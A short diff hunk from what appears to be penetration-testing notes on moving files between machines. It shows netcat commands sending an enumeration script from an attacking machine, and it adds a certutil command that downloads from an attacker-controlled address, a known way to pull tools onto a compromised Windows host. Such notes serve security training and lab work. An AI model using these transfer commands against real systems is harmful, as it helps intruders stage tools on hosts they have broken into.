@@ -34,6 +34,8 @@ nc -lvp 3333 > enum.sh
 
 And on the attacking machine we send the file like this:
 nc 192.168.1.103 < enum.sh
+
+C:\Windows\System32\certutil.exe -urlcache -f http://192.168.49.98/
 ```
 
 ##### wget in ram
